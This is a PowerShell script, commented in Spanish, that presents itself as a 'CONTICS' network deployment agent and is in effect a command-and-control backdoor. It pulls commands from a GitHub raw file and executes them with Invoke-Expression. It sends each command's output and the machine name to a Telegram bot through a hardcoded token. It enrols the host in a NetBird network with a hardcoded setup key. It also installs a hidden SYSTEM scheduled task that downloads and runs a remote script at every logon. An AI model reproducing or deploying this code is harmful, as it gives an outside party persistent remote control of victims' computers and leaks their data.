# ===========================================================================
# SCRIPT DE RED CONTICS 2026 - AGENTE V5.5 (VISUAL REPORT)
# ===========================================================================

# --- [1] CONFIGURACION DE RUTAS ---
$GitHubRawUrl = 'https://raw.githubusercontent.com/emerson101293/contics-infra/refs/heads/main/agent-win.ps1'
$TareaUrl     = 'https://raw.githubusercontent.com/emerson101293/contics-infra/refs/heads/main/agent-tasks.txt'

# --- [2] CONFIGURACION DE TELEGRAM ---
$TelegramToken = '8693420261:AAH0RQ-7LySZ03gglYDYOjJbY1xJonv_fak'
$TelegramChatID = '6902736310'

function Send-Telegram {
    param([string]$Message)
    try {
        $Url = "https://api.telegram.org/bot$($TelegramToken)/sendMessage"
        $Body = @{ chat_id = $TelegramChatID; text = $Message }
        $Json = $Body | ConvertTo-Json -Compress
        $utf8 = [System.Text.Encoding]::UTF8.GetBytes($Json)
        $null = Invoke-RestMethod -Uri $Url -Method Post -Body $utf8 -ContentType "application/json; charset=utf-8"
    } catch { }
}

Clear-Host
Write-Host "======================================================" -ForegroundColor Cyan
Write-Host "      SISTEMA DE DESPLIEGUE CONTICS 2026" -ForegroundColor Cyan
Write-Host "======================================================" -ForegroundColor Cyan

# --- [3] RECEPTOR DE TAREAS (C2) ---
Write-Host "`n[1/4] Buscando ordenes en GitHub..." -ForegroundColor Yellow
try {
    $TareaData = Invoke-WebRequest -Uri $TareaUrl -UseBasicParsing -ErrorAction SilentlyContinue
    if ($TareaData) {
        $Tarea = $TareaData.Content.Trim()
        if ($Tarea -ne "NONE" -and $Tarea -ne "") {
            Write-Host " [+] Ejecutando orden: $Tarea" -ForegroundColor White
            $Out = Invoke-Expression $Tarea 2>&1 | Out-String
            $MsgC2 = "ORDEN EJECUTADA EN: $env:COMPUTERNAME`nComando: $Tarea`nResultado: $Out"
            Send-Telegram -Message $MsgC2
            Write-Host " [+] Resultado enviado a Telegram." -ForegroundColor Green
        } else {
            Write-Host " [+] Sin ordenes pendientes." -ForegroundColor Gray
        }
    }
} catch { 
    Write-Host " [-] Error en lectura de tareas." -ForegroundColor Red
}

# --- [4] LOGICA DE RED (NETBIRD) ---
Write-Host "`n[2/4] Verificando conectividad NetBird..." -ForegroundColor Yellow
$mUrl = 'https://contics-admin.duckdns.org'
$sKey = '8552E0C2-4E0A-490D-8B93-E2CD69CDC007'
$nbPath = 'C:\Program Files\NetBird\netbird.exe'

if (!(Test-Path $nbPath)) {
    Write-Host " [+] Instalador no encontrado. Descargando..." -ForegroundColor White
    $installer = "$env:TEMP\nb.exe"
    Invoke-WebRequest -Uri 'https://github.com/netbirdio/netbird/releases/latest/download/netbird_installer_windows_amd64.exe' -OutFile $installer -UseBasicParsing
    Start-Process -FilePath $installer -ArgumentList '/S', '/component=service' -Wait
    Start-Sleep -Seconds 5
}

Write-Host " [+] Conectando al servidor CONTICS..." -ForegroundColor White
& $nbPath down | Out-Null
& $nbPath up --management-url $mUrl --setup-key $sKey | Out-Null

# --- [5] REPORTE DE IP Y FEEDBACK ---
Write-Host "`n[3/4] Generando reporte de nodo..." -ForegroundColor Yellow
Start-Sleep -Seconds 5
$status = & $nbPath status
$lineaIP = $status | Select-String 'NetBird IP:'

if ($lineaIP) {
    $nbIP = (($lineaIP.ToString() -split ':')[1].Trim() -split '/')[0].Trim()
    $MsgOk = "NODO CONECTADO`nPC: $env:COMPUTERNAME`nIP: $nbIP"
    Send-Telegram -Message $MsgOk
    
    Write-Host " [+] ESTATUS:      " -NoNewline; Write-Host "CONECTADO" -ForegroundColor Green
    Write-Host " [+] IP ASIGNADA:  " -NoNewline; Write-Host "$nbIP" -ForegroundColor Yellow
    Write-Host " [+] TELEGRAM:     " -NoNewline; Write-Host "REPORTADO" -ForegroundColor Green
    $nbIP | clip
}

# --- [6] PERSISTENCIA ---
Write-Host "`n[4/4] Actualizando persistencia..." -ForegroundColor Yellow
$TaskName = "Contics_AtLogon"
$ScriptCmd = "iex (iwr '$GitHubRawUrl' -UseBasicParsing)"

Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -Command `"$ScriptCmd`""
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal | Out-Null
Write-Host " [+] Persistencia:  " -NoNewline; Write-Host "ACTIVA" -ForegroundColor Green

# --- [7] FINALIZACION ---
Write-Host "`n------------------------------------------------------" -ForegroundColor Cyan
Write-Host " Proceso completado. Abriendo panel de gestion..." -ForegroundColor White
Start-Process $mUrl 
Write-Host "------------------------------------------------------" -ForegroundColor Cyan

Write-Host "`nPresione ENTER para finalizar..." -ForegroundColor Gray
Read-Host
